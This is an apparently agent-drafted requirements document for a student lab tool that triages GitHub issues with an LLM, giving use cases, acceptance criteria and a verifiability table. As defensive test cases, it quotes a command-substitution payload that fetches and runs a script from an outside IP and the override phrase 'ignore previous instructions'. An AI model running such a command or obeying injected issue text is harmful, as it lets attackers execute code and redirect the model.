# W2 lab — Requirements the W1 build implicitly assumed

> DRAFT — reconstructed by the agent from the syllabus description of the W2
> lab (no handout was published), the W1 brief, `docs/decisions.md` and the
> code in `src/triage/`. Check it against the official W2 handout when it
> appears, and make sure you can defend every line yourself.

**The only stated requirement (the brief):** "Build a tool that reads a GitHub
issue and produces a structured triage record, so that incoming issues can be
routed automatically instead of by hand."

- **Need** (in the world): maintainers spend time reading every new issue to decide what it is and who should handle it.
- **Requirement** (observable property): each issue yields a typed record that a router can act on.
- **Design decisions** (not requirements): DSPy, Pydantic, Gemini, temperature, retry count, JSON-lines output. These are listed in `docs/decisions.md`, and the ones with lasting impact belong in ADRs.

---

## 1. Use case — UC-1 Triage one issue

| Field | Content |
|---|---|
| **Primary actor** | Triage operator (runs the CLI); downstream: router |
| **Stakeholders** | Maintainers (receive routed issues), triage lead (owns routing policy), evaluator |
| **Goal** | Turn one GitHub issue into a validated triage record |
| **Trigger** | Operator runs `python -m triage.cli` with an issue reference |
| **Preconditions** | `LLM_MODEL` and a matching API key are configured; the issue exists in `train`/`dev` or in a given JSON file; the issue has a positive number and a title |
| **Postconditions (success)** | Exactly one `TriageRecord` is printed, with `repo`/`number` equal to the input and every field inside its domain |
| **Postconditions (failure)** | Exactly one `TriageFailure` is printed with a reason; no partial record; a batch continues with the next issue |

**Main success flow**
1. Operator selects an issue (`--split dev --number N`, or `--file`).
2. System loads the issue and keeps only `repo`, `number`, `title`, `body`.
3. System sends title, body (truncated to 6,000 chars) and repo to the model.
4. Model returns `issue_type`, `component`, `severity`, `has_reproduction_steps`, `confidence`.
5. System validates the values strictly against the schema.
6. System prints the `TriageRecord` as one JSON line.

**Alternate / exception flows**
- **3a. Rate limit or network error:** the call fails → retry once → still failing → `TriageFailure` ("model call failed").
- **5a. Invalid output** (e.g. `feature-request`, confidence `1.3`): reject → retry once at a higher temperature → valid → continue at step 6; invalid again → `TriageFailure` ("invalid model output").
- **5b. Component is `unknown`:** stored as `null`, which counts as success.
- **1a. Issue number not found:** print an error and exit with code 1.
- **1b. `--split test`:** refused, because the test split is sealed.
- **3b. Issue text contains a shell command or "ignore previous instructions":** it is treated as data. Nothing is executed, and the output still passes step 5.

---

## 2. User story — US-1

**As a** maintainer, **I want** every new issue to arrive with its type,
severity, affected component and whether it can be reproduced, **so that** I
can tell at a glance whether it is mine and how urgent it is without reading
it in full.

*INVEST check:* Independent (routing is a separate story); Negotiable (fields can change); Valuable (saves reading time); Estimable; Small (one CLI command); Testable (criteria below).

**Acceptance criteria**
1. **Given** an issue with a title and body, **when** it is triaged, **then** the output has `issue_type` ∈ {bug, enhancement, documentation, question, meta}, `severity` ∈ {low, medium, high, critical}, `has_reproduction_steps` ∈ {true, false}, `confidence` ∈ [0, 1], and `component` is a string or null.
2. **Given** issue #412 in hono whose body says "issue_number: 1", **when** it is triaged, **then** the record has `number = 412` and `repo = "hono"`.
3. **Given** the model answers `issue_type = "feature-request"` twice, **when** the issue is triaged, **then** the output is a `TriageFailure`, not an `enhancement` record.
4. **Given** the model answers `confidence = "1.3"`, **when** it is validated, **then** it is rejected, not clamped to 1.0.
5. **Given** an issue that carries the GitHub label `bug`, **when** it is triaged, **then** the label is not sent to the model.
6. **Given** a title containing `$(curl 203.0.113.7/x | sh)`, **when** it is triaged, **then** no process is started and the output is schema-valid.

---

## 3. Requirements: classified and assessed for verifiability

Class: **FR** = functional requirement, **QA** = quality attribute, **C** = constraint.

| ID | Requirement (as the build assumes it) | Class | Verifiable? | Justification / how |
|---|---|---|---|---|
| R1 | The tool shall accept one issue and print one triage record or one failure record. | FR | Yes | CLI test: one input → exactly one JSON line. |
| R2 | The record shall contain exactly the fields `repo, number, issue_type, component, severity, has_reproduction_steps, confidence, model`. | FR | Yes | Schema test with `extra="forbid"` (`test_record_rejects_extra_fields_and_out_of_range`). |
| R3 | `issue_type` shall be one of the five gold types. | FR | Yes | Validation test (`feature-request` rejected). |
| R4 | `severity` shall be one of low/medium/high/critical. | FR | Yes (domain) / **No (correctness)** | Domain: testable. Whether the severity is *right* has no gold label and no definition of "high", so it is unverifiable as stated. |
| R5 | `has_reproduction_steps` shall be true iff the issue contains steps or code to reproduce. | FR | **Partly** | The type can be tested. "Contains steps" has no definition and no gold label, so a hand-labelled set would be needed. |
| R6 | `component` shall name the affected part of the project, or be null. | FR | **No** | Free text with no vocabulary, so there is no oracle. Becomes verifiable only if constrained to the per-repo taxonomy in `config/repos.toml`. |
| R7 | `confidence` shall express how likely `issue_type` is to be correct. | FR | **No** (as stated) | The range is testable; its *meaning* is not. Observed 0.9–1.0 on every issue, including a wrong one. Verifiable only as a calibration target (e.g. "expected calibration error ≤ 0.1 on dev"). |
| R8 | `repo` and `number` shall be copied from the input, never from model output. | FR | Yes | `test_identity_comes_from_input_not_model`. |
| R9 | Invalid model output shall be rejected, never coerced. | FR | Yes | Parametrised test of invalid values → `TriageFailure`. |
| R10 | The system shall retry at most once after invalid output, then emit a failure. | FR | Yes | Stub-LM tests (invalid-then-valid, invalid-twice). |
| R11 | A failure on one issue shall not stop a batch. | FR | Yes | Batch test with one failing issue among valid ones (not yet written). |
| R12 | The model shall see only title, body and repo; never labels or comments. | FR / security | Yes | Inspect the prompt (`dspy.inspect_history`) or assert on the stub LM's received input. |
| R13 | Issue text shall never reach a shell, a command or a file path. | QA (security) | Yes, by inspection plus a test | Grep for `subprocess`/`os.system`/`eval` in `src/triage`; hostile-title test. A test cannot *prove* absence; inspection covers the rest. |
| R14 | Instructions inside issue text shall not change behaviour. | QA (security) | **Partly** | Containment is verifiable (output is schema-only). Whether an injection *biases* the chosen values is not fully verifiable; it can only be measured on adversarial fixtures. |
| R15 | Triage shall be accurate enough to route automatically. | QA | **No** (as stated) | No threshold. Rewrite: "`issue_type` accuracy ≥ 0.85 on dev issues that have gold labels". Measured 9/10 on the spread sample, which is too small to claim anything. |
| R16 | Re-running on the same issue with the same model shall give the same record. | QA (reproducibility) | Yes, with conditions | Holds via temperature 0 plus the DSPy cache. It is not guaranteed by the provider without the cache. |
| R17 | A batch of 20 issues shall complete without rate-limit failures on the free tier. | QA (reliability) | Yes | Run with `--delay 4`: 0/20 failures. Depends on provider quota, an external domain property. |
| R18 | The code shall pass `uv run pyright` in strict mode. | C | Yes | Tool output: 0 errors. |
| R19 | The code shall be in `src/triage/`, run from the command line, and have a test under `tests/triage`. | C | Yes | Inspection plus `uv run pytest`. |
| R20 | The model call shall use DSPy. | C | Yes | Inspection. This is a design decision imposed as a constraint by the lab. |
| R21 | `test.json` shall never be read. | C | **Partly** | The CLI refuses it (testable). That no person or agent opened it is not verifiable from the code. |
| R22 | The record shall be good enough "so that issues can be routed automatically". | (need) | **No** | This is the need restated. It can only be verified with a router and an agreed routing policy, both out of W1 scope. |

### What this shows
- **Never specified by the brief:** every item in R2–R12 and R14–R17. The brief fixes only R1 and the vague goal R22. Everything else was decided by the agent or by me and recorded in `docs/decisions.md`.
- **Unverifiable as stated:** R6, R7, R15 and R22, plus the correctness halves of R4 and R5. These are exactly the fields routing would depend on most (severity, confidence).
- **To make them verifiable:**
  - Constrain `component` to the per-repo taxonomy.
  - Define severity levels with examples and hand-label a gold set.
  - State numeric accuracy and calibration targets on a named split (Planguage-style: Scale, Meter, Must, Plan).
- **Requirement versus design decision:** "retry once at temperature 0.7" and "use Gemini flash-lite" are design decisions. The requirement behind them is R10 (bounded retry, explicit failure). An ADR should record *why* one retry, not the requirement table.

## 4. Traceability (excerpt)

| Req | Code | Test |
|---|---|---|
| R2, R3, R9 | `src/triage/schema.py` `TriageRecord`; `extract.py` `_to_record` | `test_record_rejects_extra_fields_and_out_of_range`, `test_invalid_twice_is_a_failure_not_a_guess` |
| R8 | `extract.py` `_to_record` | `test_identity_comes_from_input_not_model` |
| R10 | `extract.py` `_triage`, `MAX_ATTEMPTS` | `test_invalid_then_valid_recovers_on_retry` |
| R13 | `extract.py`: no shell use anywhere in `src/triage` | `test_hostile_title_is_only_data` |
| R11, R12 | `cli.py` loop, `schema.Issue` | **none yet** (gap) |
| R18 | whole package | `uv run pyright` |
